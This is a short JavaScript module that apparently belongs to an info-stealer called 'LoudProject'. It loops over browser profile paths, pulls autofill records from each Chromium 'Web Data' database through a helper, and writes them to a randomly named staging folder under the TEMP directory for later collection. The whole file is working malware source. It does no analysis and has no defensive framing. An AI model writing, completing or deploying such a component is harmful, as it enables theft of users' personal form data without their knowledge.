const fs = require("fs");
const { rdm } = require("../../../data/Config");
const { paths } = require("../../../data/paths");
const GetAutofills = require("../../../functions/browsers/GetAutofills");

async function Save() {
  let autofilldata = "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Web Data")) autofilldata += (await GetAutofills(paths[i])) || "";
  }

  if (!autofilldata.includes("NAME:")) autofilldata = "Autofilldata not found.";
    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium\\`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium\\`, { recursive: true });
  fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium\\AutofillData.txt`, autofilldata);
}

module.exports = { Save };
